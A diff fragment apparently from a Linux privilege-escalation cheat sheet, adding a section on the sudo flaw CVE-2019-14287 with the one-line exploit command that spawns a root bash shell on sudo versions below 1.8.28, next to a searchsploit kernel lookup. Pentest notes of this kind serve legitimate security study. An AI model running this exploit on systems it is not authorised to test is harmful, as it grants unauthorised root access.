@@ -77,6 +77,12 @@ searchsploit linux kernel <version>
 
 # 2. Sudo Privileges
 
+If the sudo version is below 1.8.28 (Sudo-CVE-2019-14287)
+
+```
+sudo -u#-1 /bin/bash
+```
+
 Check allowed commands:
 
 ```bash
